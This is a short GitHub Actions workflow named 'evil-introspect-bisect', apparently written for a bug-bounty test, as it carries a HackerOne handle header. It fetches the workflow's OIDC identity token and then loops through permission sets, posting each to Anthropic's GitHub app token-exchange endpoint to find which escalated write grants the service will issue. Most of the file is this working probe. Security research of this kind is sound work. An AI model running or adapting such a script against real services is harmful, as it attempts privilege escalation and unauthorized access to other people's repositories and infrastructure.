name: evil-introspect-bisect

on:
  workflow_call:

permissions:
  id-token: write
  contents: read

jobs:
  exchange:
    runs-on: ubuntu-latest
    steps:
      - name: Bisect permission grants
        run: |
          set +e
          AUD="claude-code-github-action"
          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
          TOK=$(curl -sk -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$URL" | jq -r .value)
          echo "::add-mask::$TOK"
          for kind in metadata checks statuses discussions actions:write actions:read checks:read checks:write statuses:read security_events:write security_events:read members:read members:write deployments:read pull_requests:read issues:read; do
            P="$(echo $kind | grep -q ':' && echo \"$kind\" | awk -F: '{print "\""$1"\":\""$2"\""}' || echo "\"$kind\":\"write\"")"
            BODY="{\"permissions\":{\"contents\":\"write\",$P}}"
            HTTP=$(curl -sk -o /tmp/r.json -w '%{http_code}' \
              -X POST "https://api.anthropic.com/api/github/github-app-token-exchange" \
              -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -H "X-HackerOne-Handle: liamconner10" \
              -d "$BODY")
            R=$(jq -c 'if .token then {ok:true} else {ok:false, code:.error.details.error_code} end' /tmp/r.json)
            echo "BISECT: kind=$kind body=$BODY http=$HTTP resp=$R"
          done
